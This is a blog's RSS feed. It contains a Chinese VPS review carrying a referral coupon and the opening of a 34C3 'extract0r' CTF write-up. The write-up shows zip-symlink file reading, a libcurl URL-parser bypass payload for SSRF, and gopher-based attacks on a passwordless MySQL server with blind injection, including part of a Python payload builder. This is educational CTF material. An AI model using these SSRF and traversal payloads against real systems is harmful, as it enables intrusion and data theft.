<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>james' blog</title><link>https://blog.123577.xyz/</link><description>Recent content on james' blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 27 Aug 2023 15:38:53 +0800</lastBuildDate><atom:link href="https://blog.123577.xyz/index.xml" rel="self" type="application/rss+xml"/><item><title>About</title><link>https://blog.123577.xyz/about/</link><pubDate>Thu, 03 Jun 2021 18:50:57 +0800</pubDate><guid>https://blog.123577.xyz/about/</guid><description>记录Debug日常、思考和玩机</description></item><item><title>Friends</title><link>https://blog.123577.xyz/link/</link><pubDate>Mon, 13 Sep 2021 17:10:56 +0800</pubDate><guid>https://blog.123577.xyz/link/</guid><description/></item><item><title>搬瓦工93刀机器测评</title><link>https://blog.123577.xyz/posts/%E6%90%AC%E7%93%A6%E5%B7%A593%E5%88%80%E6%9C%BA%E5%99%A8%E6%B5%8B%E8%AF%84/</link><pubDate>Sun, 27 Aug 2023 15:38:53 +0800</pubDate><guid>https://blog.123577.xyz/posts/%E6%90%AC%E7%93%A6%E5%B7%A593%E5%88%80%E6%9C%BA%E5%99%A8%E6%B5%8B%E8%AF%84/</guid><description>一、搬瓦工介绍 搬瓦工（BandwagonHost）是一家提供VPS（虚拟专用服务器）和云服务器服务的服务提供商。他们提供各种不同配置的虚拟服务器，适用于个人用户、开发者和企业。搬瓦工以其价格相对亲民和简便易用而受到一些用户的欢迎。
该公司总部位于美国，但他们的服务器分布在全球不同的数据中心，包括北美、欧洲和亚洲等地。搬瓦工提供了多种操作系统选择，如Linux和Windows，以及一些常用的应用程序和工具。
其推出的GIA线路深受广大用户喜爱，对大陆友好，适合建站和自用。
今天测评的一款就是在46刀传家宝高溢价的情况下推出的一款性价比极高的机器，其推出后原46刀传家宝瞬间溢价打骨折，可见其CP值之高，今天就让我们看一下此机器具体的情况。
套餐介绍 搬瓦工 CN2 GIA-E 40G 限量版套餐，价格是 $99.9 美元/年，只能年付，不支持月付或者季付，使用优惠码之后价格是 93.1 美元。购买后可以在 14 个机房任意切换。
搬瓦工优惠码：BWHCCNCXVV（优惠力度 6.58%）
值得一提的是没有香港机房可选，可选机房如下：
US: Los Angeles, California (DC6 CT CN2GIA-E) [USCA_6] US: Los Angeles, California (DC9 CT CN2GIA) [USCA_9] US: Los Angeles, California (DC3 CN2) [USCA_3] US: Los Angeles, California (DC8 ZNET) [USCA_8] US: Los Angeles, California (DC2 AO) [USCA_2] US: Los Angeles, California (DC4 MCOM) [USCA_4] US: Fremont, California [USCA_FMT] US: New Jersey [USNJ] US: New York [USNY_2] CA: British Columbia, Vancouver [CABC_1] CA: British Columbia, Vancouver (CN2GIA) [CABC_6] EU: Amsterdam, Netherlands [EUNL_3] EU: Amsterdam, Netherlands (China Unicom Premium) [EUNL_9] Japan: Osaka (Softbank) [JPOS_1] 有广大用户喜爱的DC6和DC9以及日本软银。</description></item><item><title>[补番]34c3 extrac0tr writeup</title><link>https://blog.123577.xyz/posts/34c3-extract0r/</link><pubDate>Tue, 27 Sep 2022 15:38:53 +0800</pubDate><guid>https://blog.123577.xyz/posts/34c3-extract0r/</guid><description>每个月定期补一些老题目，记录一下。这题算是老题新做吧，最后一步自己的小思路貌似在网上没有找到一样的，嘿嘿。
第一步，上传symlink，列目录读文件
题目通过url下载一个zip文件，然后解压到指定目录。通过上传一个打包了symlink文件的zip，解压后就可以用这个symlink遍历目录，实现任意文件读。
在/home/extract0r目录下发现flag位置，在mysql数据库里，并且发现数据库的m4st3r_ov3rl0rd用户有读flag表的权限，此用户没有设置密码 在/var/www/html目录下读到源码 知识点：linux下的symlink文件可以打包到zip里，解压后可以通过symlink文件进行目录遍历
障碍点：这里想着直接通过读取mysql数据库文件的方式拿flag，发现目录遍历没有遍历出mysql所在的目录。然后自己本地起一个mysql服务发现，mysql的目录默认对于非mysql用户和组的用户没有可读权限，想想这也是合理的。
第二步，通过源码得知题目用php自带的curl函数发起请求，底层调用libcurl的函数，libcurl这个库存在很多冗余写法，很容易绕过php的parse_url的过滤。这一步就考虑利用curl的gopher协议进行ssrf，其中绕过的payload如下
http://foo@[cafebeef.cf]:foo@github.com:3306/ 知识点：libcurl非常宽松，有很多公开的和未公开的绕过姿势。
第三步， 内网只有本地一个mysql，只能考虑mysql的无交互ssrf。
原本的印象是mysql这种需要交互的协议无法ssrf，这题考点就是无密码的mysql也是可以ssrf的。
于是本地拉起一个mysql，设置一个无密码用户和flag表，进行一次查询flag的sql语句，用wireshark把包dump下来。
tips: mysql客户端指定ssl-mode可以强制mysql不使用tls通信
echo &amp;#39;select flag from flag.flag;&amp;#39; | mysql -h 127.0.0.1 --ssl-mode=DISABLED -um4st3r_ov3rl0rd wireshark打开如下
发现客户端发了4个包
第1次发送登录请求，服务端返回Response OK 由于需要登录的用户不需要密码，第2个包就直接发送sql指令过去了，没有challenge的过程 把这个payload构造一下然后利用ssrf发送给mysql就可以执行任意sql语句了。
看到github上一种解法是在sql语句的返回中构造一个合法的zip把flag的内容包含到一个文件中，然后借助题目的解包功能拿到flag，或者是时间盲注。但我觉得这两种都比较耗费时间。注意题目在判断curl返回后有很多逻辑，看了一下是可以根据这个逻辑进行盲注的。我们可以在sql的返回中插入一个zip文件流，这里可以插入一个空的zip文件
root@be498edb0379:/# xxd 1.zip 00000000: 504b 0506 0000 0000 0000 0000 0000 0000 PK.............. 00000010: 0000 0000 0000 ...... root@be498edb0379:/# 这样根据代码逻辑，检测到zip，就正常返回，没有检测到zip，就输出Archive's size 0 not supported，这样就可以进行逻辑盲注。下面的图片有错误，一个空的zip文件的完整十六进制表示是504b0506000000000000000000000000000000000000
# payload #!/usr/bin/env python # -*- coding=utf-8 -*- import binascii from urllib.parse import quote_plus import requests def build_payload(sql): auth_p = &amp;#34;ad00000185a2bf01000000010800000000000000000000000000000000000000000000006d34737433725f6f7633726c30726400006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630370f5f636c69656e745f76657273696f6e06352e372e3235095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c&amp;#34; sql_p = &amp;#34;{}00000003{}&amp;#34; close_p = &amp;#34;0100000001&amp;#34; l = hex(len(sql) + 1)[2:] sql = binascii.</description></item></channel></rss>